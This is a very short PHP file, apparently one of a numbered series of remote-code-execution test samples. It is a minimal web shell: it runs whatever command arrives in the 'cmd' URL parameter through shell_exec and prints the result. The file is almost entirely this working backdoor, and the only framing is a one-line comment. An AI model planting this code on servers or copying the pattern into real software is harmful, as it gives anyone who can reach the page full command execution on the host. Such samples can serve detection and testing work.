<?php
// RCE test variation #305
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>